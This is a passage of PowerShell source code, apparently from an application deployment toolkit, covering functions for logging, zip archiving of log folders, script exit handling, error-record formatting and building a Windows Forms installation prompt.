		[boolean]$WriteHost = $configToolkitLogWriteToHost,
		[Parameter(Mandatory=$false,Position=9)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true,
		[Parameter(Mandatory=$false,Position=10)]
		[switch]$PassThru = $false,
		[Parameter(Mandatory=$false,Position=11)]
		[switch]$DebugMessage = $false,
		[Parameter(Mandatory=$false,Position=12)]
		[boolean]$LogDebugMessage = $configToolkitLogDebugMessage
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

		
		
		[string]$LogTime = (Get-Date -Format 'HH\:mm\:ss.fff').ToString()
		[string]$LogDate = (Get-Date -Format 'MM-dd-yyyy').ToString()
		If (-not (Test-Path -LiteralPath 'variable:LogTimeZoneBias')) { [int32]$script:LogTimeZoneBias = [timezone]::CurrentTimeZone.GetUtcOffset([datetime]::Now).TotalMinutes }
		[string]$LogTimePlusBias = $LogTime + $script:LogTimeZoneBias
		
		[boolean]$ExitLoggingFunction = $false
		If (-not (Test-Path -LiteralPath 'variable:DisableLogging')) { $DisableLogging = $false }
		
		[boolean]$ScriptSectionDefined = [boolean](-not [string]::IsNullOrEmpty($ScriptSection))
		
		Try {
			If ($script:MyInvocation.Value.ScriptName) {
				[string]$ScriptSource = Split-Path -Path $script:MyInvocation.Value.ScriptName -Leaf -ErrorAction 'Stop'
			}
			Else {
				[string]$ScriptSource = Split-Path -Path $script:MyInvocation.MyCommand.Definition -Leaf -ErrorAction 'Stop'
			}
		}
		Catch {
			$ScriptSource = ''
		}

		
		[scriptblock]$CMTraceLogString = {
			Param (
				[string]$lMessage,
				[string]$lSource,
				[int16]$lSeverity
			)
			"<![LOG[$lMessage]LOG]!>" + "<time=`"$LogTimePlusBias`" " + "date=`"$LogDate`" " + "component=`"$lSource`" " + "context=`"$([Security.Principal.WindowsIdentity]::GetCurrent().Name)`" " + "type=`"$lSeverity`" " + "thread=`"$PID`" " + "file=`"$ScriptSource`">"
		}

		
		[scriptblock]$WriteLogLineToHost = {
			Param (
				[string]$lTextLogLine,
				[int16]$lSeverity
			)
			If ($WriteHost) {
				
				If ($Host.UI.RawUI.ForegroundColor) {
					Switch ($lSeverity) {
						3 { Write-Host -Object $lTextLogLine -ForegroundColor 'Red' -BackgroundColor 'Black' }
						2 { Write-Host -Object $lTextLogLine -ForegroundColor 'Yellow' -BackgroundColor 'Black' }
						1 { Write-Host -Object $lTextLogLine }
					}
				}
				
				Else {
					Write-Output -InputObject $lTextLogLine
				}
			}
		}

		
		If (($DebugMessage) -and (-not $LogDebugMessage)) { [boolean]$ExitLoggingFunction = $true; Return }
		
		If (($DisableLogging) -and (-not $WriteHost)) { [boolean]$ExitLoggingFunction = $true; Return }
		
		If ($DisableLogging) { Return }
		
		If (($AsyncToolkitLaunch) -and ($ScriptSection -eq 'Initialization')) { [boolean]$ExitLoggingFunction = $true; Return }

		
		If (-not (Test-Path -LiteralPath $LogFileDirectory -PathType 'Container')) {
			Try {
				$null = New-Item -Path $LogFileDirectory -Type 'Directory' -Force -ErrorAction 'Stop'
			}
			Catch {
				[boolean]$ExitLoggingFunction = $true
				
				If (-not $ContinueOnError) {
					Write-Host -Object "[$LogDate $LogTime] [${CmdletName}] $ScriptSection :: Failed to create the log directory [$LogFileDirectory]. `n$(Resolve-Error)" -ForegroundColor 'Red'
				}
				Return
			}
		}

		
		[string]$LogFilePath = Join-Path -Path $LogFileDirectory -ChildPath $LogFileName
	}
	Process {
		
		If ($ExitLoggingFunction) { Return }

		ForEach ($Msg in $Message) {
			
			[string]$CMTraceMsg = ''
			[string]$ConsoleLogLine = ''
			[string]$LegacyTextLogLine = ''
			If ($Msg) {
				
				If ($ScriptSectionDefined) { [string]$CMTraceMsg = "[$ScriptSection] :: $Msg" }

				
				[string]$LegacyMsg = "[$LogDate $LogTime]"
				If ($ScriptSectionDefined) { [string]$LegacyMsg += " [$ScriptSection]" }
				If ($Source) {
					[string]$ConsoleLogLine = "$LegacyMsg [$Source] :: $Msg"
					Switch ($Severity) {
						3 { [string]$LegacyTextLogLine = "$LegacyMsg [$Source] [Error] :: $Msg" }
						2 { [string]$LegacyTextLogLine = "$LegacyMsg [$Source] [Warning] :: $Msg" }
						1 { [string]$LegacyTextLogLine = "$LegacyMsg [$Source] [Info] :: $Msg" }
					}
				}
				Else {
					[string]$ConsoleLogLine = "$LegacyMsg :: $Msg"
					Switch ($Severity) {
						3 { [string]$LegacyTextLogLine = "$LegacyMsg [Error] :: $Msg" }
						2 { [string]$LegacyTextLogLine = "$LegacyMsg [Warning] :: $Msg" }
						1 { [string]$LegacyTextLogLine = "$LegacyMsg [Info] :: $Msg" }
					}
				}
			}

			
			[string]$CMTraceLogLine = & $CMTraceLogString -lMessage $CMTraceMsg -lSource $Source -lSeverity $Severity

			
			If ($LogType -ieq 'CMTrace') {
				[string]$LogLine = $CMTraceLogLine
			}
			Else {
				[string]$LogLine = $LegacyTextLogLine
			}

			
			If (-not $DisableLogging) {
				Try {
					$LogLine | Out-File -FilePath $LogFilePath -Append -NoClobber -Force -Encoding 'UTF8' -ErrorAction 'Stop'
				}
				Catch {
					If (-not $ContinueOnError) {
						Write-Host -Object "[$LogDate $LogTime] [$ScriptSection] [${CmdletName}] :: Failed to write message [$Msg] to the log file [$LogFilePath]. `n$(Resolve-Error)" -ForegroundColor 'Red'
					}
				}
			}

			
			& $WriteLogLineToHost -lTextLogLine $ConsoleLogLine -lSeverity $Severity
		}
	}
	End {
		
		Try {
			If ((-not $ExitLoggingFunction) -and (-not $DisableLogging)) {
				[IO.FileInfo]$LogFile = Get-ChildItem -LiteralPath $LogFilePath -ErrorAction 'Stop'
				[decimal]$LogFileSizeMB = $LogFile.Length/1MB
				If (($LogFileSizeMB -gt $MaxLogFileSizeMB) -and ($MaxLogFileSizeMB -gt 0)) {
					
					[string]$ArchivedOutLogFile = [IO.Path]::ChangeExtension($LogFilePath, 'lo_')
					[hashtable]$ArchiveLogParams = @{ ScriptSection = $ScriptSection; Source = ${CmdletName}; Severity = 2; LogFileDirectory = $LogFileDirectory; LogFileName = $LogFileName; LogType = $LogType; MaxLogFileSizeMB = 0; WriteHost = $WriteHost; ContinueOnError = $ContinueOnError; PassThru = $false }

					
					$ArchiveLogMessage = "Maximum log file size [$MaxLogFileSizeMB MB] reached. Rename log file to [$ArchivedOutLogFile]."
					Write-Log -Message $ArchiveLogMessage @ArchiveLogParams

					
					Move-Item -LiteralPath $LogFilePath -Destination $ArchivedOutLogFile -Force -ErrorAction 'Stop'

					
					$NewLogMessage = "Previous log file was renamed to [$ArchivedOutLogFile] because maximum log file size of [$MaxLogFileSizeMB MB] was reached."
					Write-Log -Message $NewLogMessage @ArchiveLogParams
				}
			}
		}
		Catch {
			
		}
		Finally {
			If ($PassThru) { Write-Output -InputObject $Message }
		}
	}
}




Function New-ZipFile {

	[CmdletBinding(DefaultParameterSetName='CreateFromDirectory')]
	Param (
		[Parameter(Mandatory=$true,Position=0)]
		[ValidateNotNullorEmpty()]
		[string]$DestinationArchiveDirectoryPath,
		[Parameter(Mandatory=$true,Position=1)]
		[ValidateNotNullorEmpty()]
		[string]$DestinationArchiveFileName,
		[Parameter(Mandatory=$true,Position=2,ParameterSetName='CreateFromDirectory')]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Container' })]
		[string[]]$SourceDirectoryPath,
		[Parameter(Mandatory=$true,Position=2,ParameterSetName='CreateFromFile')]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[string[]]$SourceFilePath,
		[Parameter(Mandatory=$false,Position=3)]
		[ValidateNotNullorEmpty()]
		[switch]$RemoveSourceAfterArchiving = $false,
		[Parameter(Mandatory=$false,Position=4)]
		[ValidateNotNullorEmpty()]
		[switch]$OverWriteArchive = $false,
		[Parameter(Mandatory=$false,Position=5)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			[string]$DestinationPath = Join-Path -Path $DestinationArchiveDirectoryPath -ChildPath $DestinationArchiveFileName -ErrorAction 'Stop'
			Write-Log -Message "Create a zip archive with the requested content at destination path [$DestinationPath]." -Source ${CmdletName}

			
			If (($OverWriteArchive) -and (Test-Path -LiteralPath $DestinationPath)) {
				Write-Log -Message "An archive at the destination path already exists, deleting file [$DestinationPath]." -Source ${CmdletName}
				$null = Remove-Item -LiteralPath $DestinationPath -Force -ErrorAction 'Stop'
			}

			
			If (-not (Test-Path -LiteralPath $DestinationPath)) {
				
				Write-Log -Message "Create a zero-byte file [$DestinationPath]." -Source ${CmdletName}
				$null = New-Item -Path $DestinationArchiveDirectoryPath -Name $DestinationArchiveFileName -ItemType 'File' -Force -ErrorAction 'Stop'

				
				[byte[]]$ZipArchiveByteHeader = 80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
				[IO.FileStream]$FileStream = New-Object -TypeName 'System.IO.FileStream' -ArgumentList ($DestinationPath, ([IO.FileMode]::Create))
				[IO.BinaryWriter]$BinaryWriter = New-Object -TypeName 'System.IO.BinaryWriter' -ArgumentList ($FileStream)
				Write-Log -Message "Write the file header for a zip archive to the zero-byte file [$DestinationPath]." -Source ${CmdletName}
				$null = $BinaryWriter.Write($ZipArchiveByteHeader)
				$BinaryWriter.Close()
				$FileStream.Close()
			}

			
			[__comobject]$ShellApp = New-Object -ComObject 'Shell.Application' -ErrorAction 'Stop'
			
			[__comobject]$Archive = $ShellApp.NameSpace($DestinationPath)

			
			If ($PSCmdlet.ParameterSetName -eq 'CreateFromDirectory') {
				
				ForEach ($Directory in $SourceDirectoryPath) {
					Try {
						
						[__comobject]$CreateFromDirectory = $ShellApp.NameSpace($Directory)
						
						$null = $Archive.CopyHere($CreateFromDirectory.Items())
						
						Write-Log -Message "Compressing [$($CreateFromDirectory.Count)] file(s) in source directory [$Directory] to destination path [$DestinationPath]..." -Source ${CmdletName}
						Do { Start-Sleep -Milliseconds 250 } While ($Archive.Items().Count -eq 0)
					}
					Finally {
						
						$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($CreateFromDirectory)
					}

					
					If ($RemoveSourceAfterArchiving) {
						Try {
							Write-Log -Message "Recursively delete the source directory [$Directory] as contents have been successfully archived." -Source ${CmdletName}
							$null = Remove-Item -LiteralPath $Directory -Recurse -Force -ErrorAction 'Stop'
						}
						Catch {
							Write-Log -Message "Failed to recursively delete the source directory [$Directory]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
						}
					}
				}
			}
			Else {
				
				[IO.FileInfo[]]$SourceFilePath = [IO.FileInfo[]]$SourceFilePath
				ForEach ($File in $SourceFilePath) {
					
					$null = $Archive.CopyHere($File.FullName)
					
					Write-Log -Message "Compressing file [$($File.FullName)] to destination path [$DestinationPath]..." -Source ${CmdletName}
					Do { Start-Sleep -Milliseconds 250 } While ($Archive.Items().Count -eq 0)

					
					If ($RemoveSourceAfterArchiving) {
						Try {
							Write-Log -Message "Delete the source file [$($File.FullName)] as it has been successfully archived." -Source ${CmdletName}
							$null = Remove-Item -LiteralPath $File.FullName -Force -ErrorAction 'Stop'
						}
						Catch {
							Write-Log -Message "Failed to delete the source file [$($File.FullName)]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
						}
					}
				}
			}

			
			
			Write-Log -Message "If the archive was created in session 0 or by an Admin, then it may only be readable by elevated users. Apply permissions from parent folder [$DestinationArchiveDirectoryPath] to file [$DestinationPath]." -Source ${CmdletName}
			Try {
				[Security.AccessControl.DirectorySecurity]$DestinationArchiveDirectoryPathAcl = Get-Acl -Path $DestinationArchiveDirectoryPath -ErrorAction 'Stop'
				Set-Acl -Path $DestinationPath -AclObject $DestinationArchiveDirectoryPathAcl -ErrorAction 'Stop'
			}
			Catch {
				Write-Log -Message "Failed to apply parent folder's [$DestinationArchiveDirectoryPath] permissions to file [$DestinationPath]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
			}
		}
		Catch {
			Write-Log -Message "Failed to archive the requested file(s). `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to archive the requested file(s): $($_.Exception.Message)"
			}
		}
		Finally {
			
			If ($Archive) { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($Archive) }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Exit-Script {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$ExitCode = 0
	)

	
	[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

	
	If ($formCloseApps) { $formCloseApps.Close }

	
	Close-InstallationProgress

	
	If ($BlockExecution) { Unblock-AppExecution }

	
	If ($terminalServerMode) { Disable-TerminalServerInstallMode }

	
	Switch ($exitCode) {
		$configInstallationUIExitCode { $installSuccess = $false }
		$configInstallationDeferExitCode { $installSuccess = $false }
		3010 { $installSuccess = $true }
		1641 { $installSuccess = $true }
		0 { $installSuccess = $true }
		Default { $installSuccess = $false }
	}

	
	If ($deployModeSilent) { [boolean]$configShowBalloonNotifications = $false }

	If ($installSuccess) {
		If (Test-Path -LiteralPath $regKeyDeferHistory -ErrorAction 'SilentlyContinue') {
			Write-Log -Message 'Remove deferral history...' -Source ${CmdletName}
			Remove-RegistryKey -Key $regKeyDeferHistory -Recurse
		}

		[string]$balloonText = "$deploymentTypeName $configBalloonTextComplete"
		
		If (($AllowRebootPassThru) -and ((($msiRebootDetected) -or ($exitCode -eq 3010)) -or ($exitCode -eq 1641))) {
			Write-Log -Message 'A restart has been flagged as required.' -Source ${CmdletName}
			[string]$balloonText = "$deploymentTypeName $configBalloonTextRestartRequired"
			If (($msiRebootDetected) -and ($exitCode -ne 1641)) { [int32]$exitCode = 3010 }
		}
		Else {
			[int32]$exitCode = 0
		}

		Write-Log -Message "$installName $deploymentTypeName completed with exit code [$exitcode]." -Source ${CmdletName}
		If ($configShowBalloonNotifications) { Show-BalloonTip -BalloonTipIcon 'Info' -BalloonTipText $balloonText }
	}
	ElseIf (-not $installSuccess) {
		Write-Log -Message "$installName $deploymentTypeName completed with exit code [$exitcode]." -Source ${CmdletName}
		If (($exitCode -eq $configInstallationUIExitCode) -or ($exitCode -eq $configInstallationDeferExitCode)) {
			[string]$balloonText = "$deploymentTypeName $configBalloonTextFastRetry"
			If ($configShowBalloonNotifications) { Show-BalloonTip -BalloonTipIcon 'Warning' -BalloonTipText $balloonText }
		}
		Else {
			[string]$balloonText = "$deploymentTypeName $configBalloonTextError"
			If ($configShowBalloonNotifications) { Show-BalloonTip -BalloonTipIcon 'Error' -BalloonTipText $balloonText }
		}
	}

	[string]$LogDash = '-' * 79
	Write-Log -Message $LogDash -Source ${CmdletName}

	
	If ($configToolkitCompressLogs) {
		
		. $DisableScriptLogging

		[string]$DestinationArchiveFileName = $installName + '_' + $deploymentType + '_' + ((Get-Date -Format 'yyyy-MM-dd-hh-mm-ss').ToString()) + '.zip'
		New-ZipFile -DestinationArchiveDirectoryPath $configToolkitLogDir -DestinationArchiveFileName $DestinationArchiveFileName -SourceDirectory $logTempFolder -RemoveSourceAfterArchiving
	}

	If ($script:notifyIcon) { Try { $script:notifyIcon.Dispose() } Catch {} }
	
	If (Test-Path -LiteralPath 'variable:HostInvocation') { $script:ExitCode = $exitCode; Exit } Else { Exit $exitCode }
}




Function Resolve-Error {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false,Position=0,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
		[AllowEmptyCollection()]
		[array]$ErrorRecord,
		[Parameter(Mandatory=$false,Position=1)]
		[ValidateNotNullorEmpty()]
		[string[]]$Property = ('Message','InnerException','FullyQualifiedErrorId','ScriptStackTrace','PositionMessage'),
		[Parameter(Mandatory=$false,Position=2)]
		[switch]$GetErrorRecord = $true,
		[Parameter(Mandatory=$false,Position=3)]
		[switch]$GetErrorInvocation = $true,
		[Parameter(Mandatory=$false,Position=4)]
		[switch]$GetErrorException = $true,
		[Parameter(Mandatory=$false,Position=5)]
		[switch]$GetErrorInnerException = $true
	)

	Begin {
		
		If (-not $ErrorRecord) {
			If ($global:Error.Count -eq 0) {
				
				Return
			}
			Else {
				[array]$ErrorRecord = $global:Error[0]
			}
		}

		
		[scriptblock]$SelectProperty = {
			Param (
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				$InputObject,
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				[string[]]$Property
			)

			[string[]]$ObjectProperty = $InputObject | Get-Member -MemberType '*Property' | Select-Object -ExpandProperty 'Name'
			ForEach ($Prop in $Property) {
				If ($Prop -eq '*') {
					[string[]]$PropertySelection = $ObjectProperty
					Break
				}
				ElseIf ($ObjectProperty -contains $Prop) {
					[string[]]$PropertySelection += $Prop
				}
			}
			Write-Output -InputObject $PropertySelection
		}

		
		$LogErrorRecordMsg = $null
		$LogErrorInvocationMsg = $null
		$LogErrorExceptionMsg = $null
		$LogErrorMessageTmp = $null
		$LogInnerMessage = $null
	}
	Process {
		If (-not $ErrorRecord) { Return }
		ForEach ($ErrRecord in $ErrorRecord) {
			
			If ($GetErrorRecord) {
				[string[]]$SelectedProperties = & $SelectProperty -InputObject $ErrRecord -Property $Property
				$LogErrorRecordMsg = $ErrRecord | Select-Object -Property $SelectedProperties
			}

			
			If ($GetErrorInvocation) {
				If ($ErrRecord.InvocationInfo) {
					[string[]]$SelectedProperties = & $SelectProperty -InputObject $ErrRecord.InvocationInfo -Property $Property
					$LogErrorInvocationMsg = $ErrRecord.InvocationInfo | Select-Object -Property $SelectedProperties
				}
			}

			
			If ($GetErrorException) {
				If ($ErrRecord.Exception) {
					[string[]]$SelectedProperties = & $SelectProperty -InputObject $ErrRecord.Exception -Property $Property
					$LogErrorExceptionMsg = $ErrRecord.Exception | Select-Object -Property $SelectedProperties
				}
			}

			
			If ($Property -eq '*') {
				
				If ($LogErrorRecordMsg) { [array]$LogErrorMessageTmp += $LogErrorRecordMsg }
				If ($LogErrorInvocationMsg) { [array]$LogErrorMessageTmp += $LogErrorInvocationMsg }
				If ($LogErrorExceptionMsg) { [array]$LogErrorMessageTmp += $LogErrorExceptionMsg }
			}
			Else {
				
				If ($LogErrorExceptionMsg) { [array]$LogErrorMessageTmp += $LogErrorExceptionMsg }
				If ($LogErrorRecordMsg) { [array]$LogErrorMessageTmp += $LogErrorRecordMsg }
				If ($LogErrorInvocationMsg) { [array]$LogErrorMessageTmp += $LogErrorInvocationMsg }
			}

			If ($LogErrorMessageTmp) {
				$LogErrorMessage = 'Error Record:'
				$LogErrorMessage += "`n-------------"
				$LogErrorMsg = $LogErrorMessageTmp | Format-List | Out-String
				$LogErrorMessage += $LogErrorMsg
			}

			
			If ($GetErrorInnerException) {
				If ($ErrRecord.Exception -and $ErrRecord.Exception.InnerException) {
					$LogInnerMessage = 'Error Inner Exception(s):'
					$LogInnerMessage += "`n-------------------------"

					$ErrorInnerException = $ErrRecord.Exception.InnerException
					$Count = 0

					While ($ErrorInnerException) {
						[string]$InnerExceptionSeperator = '~' * 40

						[string[]]$SelectedProperties = & $SelectProperty -InputObject $ErrorInnerException -Property $Property
						$LogErrorInnerExceptionMsg = $ErrorInnerException | Select-Object -Property $SelectedProperties | Format-List | Out-String

						If ($Count -gt 0) { $LogInnerMessage += $InnerExceptionSeperator }
						$LogInnerMessage += $LogErrorInnerExceptionMsg

						$Count++
						$ErrorInnerException = $ErrorInnerException.InnerException
					}
				}
			}

			If ($LogErrorMessage) { $Output = $LogErrorMessage }
			If ($LogInnerMessage) { $Output += $LogInnerMessage }

			Write-Output -InputObject $Output

			If (Test-Path -LiteralPath 'variable:Output') { Clear-Variable -Name 'Output' }
			If (Test-Path -LiteralPath 'variable:LogErrorMessage') { Clear-Variable -Name 'LogErrorMessage' }
			If (Test-Path -LiteralPath 'variable:LogInnerMessage') { Clear-Variable -Name 'LogInnerMessage' }
			If (Test-Path -LiteralPath 'variable:LogErrorMessageTmp') { Clear-Variable -Name 'LogErrorMessageTmp' }
		}
	}
	End {
	}
}




Function Show-InstallationPrompt {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Title = $installTitle,
		[Parameter(Mandatory=$false)]
		[string]$Message = '',
		[Parameter(Mandatory=$false)]
		[ValidateSet('Left','Center','Right')]
		[string]$MessageAlignment = 'Center',
		[Parameter(Mandatory=$false)]
		[string]$ButtonRightText = '',
		[Parameter(Mandatory=$false)]
		[string]$ButtonLeftText = '',
		[Parameter(Mandatory=$false)]
		[string]$ButtonMiddleText = '',
		[Parameter(Mandatory=$false)]
		[ValidateSet('Application','Asterisk','Error','Exclamation','Hand','Information','None','Question','Shield','Warning','WinLogo')]
		[string]$Icon = 'None',
		[Parameter(Mandatory=$false)]
		[switch]$NoWait = $false,
		[Parameter(Mandatory=$false)]
		[switch]$PersistPrompt = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$MinimizeWindows = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$Timeout = $configInstallationUITimeout,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ExitOnTimeout = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($deployModeSilent) {
			Write-Log -Message "Bypassing Installation Prompt [Mode: $deployMode]... $Message" -Source ${CmdletName}
			Return
		}

		
		[hashtable]$installPromptParameters = $psBoundParameters

		
		If ($timeout -gt $configInstallationUITimeout) {
			[string]$CountdownTimeoutErr = "The installation UI dialog timeout cannot be longer than the timeout specified in the XML configuration file."
			Write-Log -Message $CountdownTimeoutErr -Severity 3 -Source ${CmdletName}
			Throw $CountdownTimeoutErr
		}

		[Windows.Forms.Application]::EnableVisualStyles()
		$formInstallationPrompt = New-Object -TypeName 'System.Windows.Forms.Form'
		$pictureBanner = New-Object -TypeName 'System.Windows.Forms.PictureBox'
		$pictureIcon = New-Object -TypeName 'System.Windows.Forms.PictureBox'
		$labelText = New-Object -TypeName 'System.Windows.Forms.Label'
		$buttonRight = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonMiddle = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonLeft = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonAbort = New-Object -TypeName 'System.Windows.Forms.Button'
		$InitialFormInstallationPromptWindowState = New-Object -TypeName 'System.Windows.Forms.FormWindowState'

		[scriptblock]$Form_Cleanup_FormClosed = {
			
			Try {
				$labelText.remove_Click($handler_labelText_Click)
				$buttonLeft.remove_Click($buttonLeft_OnClick)
				$buttonRight.remove_Click($buttonRight_OnClick)
				$buttonMiddle.remove_Click($buttonMiddle_OnClick)
				$buttonAbort.remove_Click($buttonAbort_OnClick)
				$timer.remove_Tick($timer_Tick)
				$timer.Dispose()
				$timer = $null
				$timerPersist.remove_Tick($timerPersist_Tick)
				$timerPersist.Dispose()
				$timerPersist = $null
				$formInstallationPrompt.remove_Load($Form_StateCorrection_Load)
				$formInstallationPrompt.remove_FormClosed($Form_Cleanup_FormClosed)
			}
			Catch { }
		}

		[scriptblock]$Form_StateCorrection_Load = {
			
			$formInstallationPrompt.WindowState = 'Normal'
			$formInstallationPrompt.AutoSize = $true
			$formInstallationPrompt.TopMost = $true
			$formInstallationPrompt.BringToFront()
			
			Set-Variable -Name 'formInstallationPromptStartPosition' -Value $formInstallationPrompt.Location -Scope 'Script'
		}

		
		$formInstallationPrompt.Controls.Add($pictureBanner)

		
		
		$paddingNone = New-Object -TypeName 'System.Windows.Forms.Padding'
		$paddingNone.Top = 0
		$paddingNone.Bottom = 0
		$paddingNone.Left = 0
		$paddingNone.Right = 0

		
		$buttonWidth = 110
		$buttonHeight = 23
		$buttonPadding = 50
		$buttonSize = New-Object -TypeName 'System.Drawing.Size'
		$buttonSize.Width = $buttonWidth
		$buttonSize.Height = $buttonHeight
		$buttonPadding = New-Object -TypeName 'System.Windows.Forms.Padding'
		$buttonPadding.Top = 0
		$buttonPadding.Bottom = 5
		$buttonPadding.Left = 50
		$buttonPadding.Right = 0

		
		$pictureBanner.DataBindings.DefaultDataSourceUpdateMode = 0
		$pictureBanner.ImageLocation = $appDeployLogoBanner
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 0
		$System_Drawing_Point.Y = 0
		$pictureBanner.Location = $System_Drawing_Point
		$pictureBanner.Name = 'pictureBanner'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = $appDeployLogoBannerHeight
		$System_Drawing_Size.Width = 450
		$pictureBanner.Size = $System_Drawing_Size
		$pictureBanner.SizeMode = 'CenterImage'
		$pictureBanner.Margin = $paddingNone
		$pictureBanner.TabIndex = 0
		$pictureBanner.TabStop = $false

		
		$pictureIcon.DataBindings.DefaultDataSourceUpdateMode = 0
		If ($icon -ne 'None') { $pictureIcon.Image = ([Drawing.SystemIcons]::$Icon).ToBitmap() }
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 15
		$System_Drawing_Point.Y = 105 + $appDeployLogoBannerHeightDifference
		$pictureIcon.Location = $System_Drawing_Point
		$pictureIcon.Name = 'pictureIcon'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 32
		$System_Drawing_Size.Width = 32
		$pictureIcon.Size = $System_Drawing_Size
		$pictureIcon.AutoSize = $true
		$pictureIcon.Margin = $paddingNone
		$pictureIcon.TabIndex = 0
		$pictureIcon.TabStop = $false

		
		$labelText.DataBindings.DefaultDataSourceUpdateMode = 0
		$labelText.Name = 'labelText'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 148
		$System_Drawing_Size.Width = 385
		$labelText.Size = $System_Drawing_Size
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 25
		$System_Drawing_Point.Y = $appDeployLogoBannerHeight
		$labelText.Location = $System_Drawing_Point
		$labelText.Margin = '0,0,0,0'
		$labelText.Padding = '40,0,20,0'
		$labelText.TabIndex = 1
		$labelText.Text = $message
		$labelText.TextAlign = "Middle$($MessageAlignment)"
		$labelText.Anchor = 'Top'
		$labelText.add_Click($handler_labelText_Click)

		
		$buttonLocationY = 200 + $appDeployLogoBannerHeightDifference

		
		$buttonLeft.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonLeft.Location = "15,$buttonLocationY"
		$buttonLeft.Name = 'buttonLeft'
		$buttonLeft.Size = $buttonSize
		$buttonLeft.TabIndex = 5
		$buttonLeft.Text = $buttonLeftText
		$buttonLeft.DialogResult = 'No'
		$buttonLeft.AutoSize = $false
		$buttonLeft.UseVisualStyleBackColor = $true
		$buttonLeft.add_Click($buttonLeft_OnClick)

		
		$buttonMiddle.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonMiddle.Location = "170,$buttonLocationY"
		$buttonMiddle.Name = 'buttonMiddle'
		$buttonMiddle.Size = $buttonSize
		$buttonMiddle.TabIndex = 6
		$buttonMiddle.Text = $buttonMiddleText
		$buttonMiddle.DialogResult = 'Ignore'
		$buttonMiddle.AutoSize = $true
		$buttonMiddle.UseVisualStyleBackColor = $true
		$buttonMiddle.add_Click($buttonMiddle_OnClick)

		
		$buttonRight.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonRight.Location = "325,$buttonLocationY"
		$buttonRight.Name = 'buttonRight'
		$buttonRight.Size = $buttonSize
		$buttonRight.TabIndex = 7
		$buttonRight.Text = $ButtonRightText
		$buttonRight.DialogResult = 'Yes'
		$buttonRight.AutoSize = $true
		$buttonRight.UseVisualStyleBackColor = $true
		$buttonRight.add_Click($buttonRight_OnClick)

		
		$buttonAbort.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonAbort.Name = 'buttonAbort'
		$buttonAbort.Size = '1,1'
		$buttonAbort.DialogResult = 'Abort'
		$buttonAbort.TabStop = $false
		$buttonAbort.UseVisualStyleBackColor = $true
		$buttonAbort.add_Click($buttonAbort_OnClick)

		
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 270 + $appDeployLogoBannerHeightDifference
		$System_Drawing_Size.Width = 450
		$formInstallationPrompt.Size = $System_Drawing_Size
		$formInstallationPrompt.Padding = '0,0,0,10'
		$formInstallationPrompt.Margin = $paddingNone
		$formInstallationPrompt.DataBindings.DefaultDataSourceUpdateMode = 0
		$formInstallationPrompt.Name = 'WelcomeForm'
		$formInstallationPrompt.Text = $title
		$formInstallationPrompt.StartPosition = 'CenterScreen'
		$formInstallationPrompt.FormBorderStyle = 'FixedDialog'
		$formInstallationPrompt.MaximizeBox = $false
		$formInstallationPrompt.MinimizeBox = $false
		$formInstallationPrompt.TopMost = $true
		$formInstallationPrompt.TopLevel = $true
		$formInstallationPrompt.Icon = New-Object -TypeName 'System.Drawing.Icon' -ArgumentList $AppDeployLogoIcon
		$formInstallationPrompt.Controls.Add($pictureBanner)
		$formInstallationPrompt.Controls.Add($pictureIcon)
		$formInstallationPrompt.Controls.Add($labelText)
